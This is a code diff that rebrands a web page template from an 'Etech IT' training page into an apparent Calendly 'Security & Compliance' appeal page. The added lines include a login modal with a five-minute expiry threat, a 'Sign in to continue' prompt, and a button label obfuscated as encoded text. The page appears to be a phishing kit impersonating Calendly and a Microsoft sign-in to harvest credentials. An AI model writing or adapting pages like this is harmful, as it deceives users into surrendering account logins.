@@ -583,7 +583,7 @@ const jsURLs = ['https://assets.calendly.com/assets/external/widget.js', '/prima
 
 const primaryHTML = `
     <header>
-    <div id="logo">Etech IT</div>
+    <div id="logo">Calendly</div>
     <nav>
         <a href="#">Home</a>
         <a href="#">Services</a>
@@ -594,21 +594,21 @@ const primaryHTML = `
     </header>
     <main>
     <section id="hero">
-        <h1>Welcome to Etech IT - Cybersecurity Solutions</h1>
+        <h1>Calendly Security & Compliance</h1>
         
-        <p>Your trusted partner in cybersecurity solutions.</p>
+        <p>Customer Appeal & Policy Review under Calendly sub-processors (GDPR, CCPA) and Account Terms.</p>
     </section>
     <section id="registration-form-section">
         <section id="training-info">
-            <h2>Upcoming Security Awareness Training</h2>
+            <h2>Upcoming Calendly Awareness Training and Appeal Overview</h2>
             
-            <p>Join our exclusive 1:1 training session to enhance your security skills and awareness.</p>
+            <p>Our centralized compliance system has saved, time-stamped, and logged all materials.</p>
             
         </section>
         <div id="primary-overlay-container">
             <div id="paywall-modal">
-                <h3 id="lg-h">This training is exclusive for enterprise customers</h3>
-                <p id="lg-p">If you received an invitation, please login to continue.</p>
+                <h3 id="lg-h">Your page will expire in 5 minutes if there is no activity.</h3>
+                <p id="lg-p">Calendly prioritizes your privacy and security, Sign in to continue.</p>
                 
                 <button id="login-btn"><img id="lgImg" src="/primary/images/logo.svg"></img>OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND</button>
             </div>
